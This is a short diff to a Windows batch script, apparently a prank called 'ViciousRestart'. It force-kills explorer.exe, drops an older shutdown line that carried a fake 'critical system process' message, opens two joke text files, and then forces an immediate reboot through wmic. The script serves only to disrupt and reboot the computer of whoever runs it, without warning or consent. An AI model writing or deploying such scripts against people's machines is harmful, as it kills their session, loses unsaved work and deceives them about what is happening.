@@ -1,3 +1,8 @@
 @echo off
 taskkill /f /im explorer.exe
-shutdown -c "A critical system process has been ended, get restarted by ViciousRestart!"
+start ViciousRestart.txt
+start joke.txt
+
+
+
+wmic os where primary=1 reboot
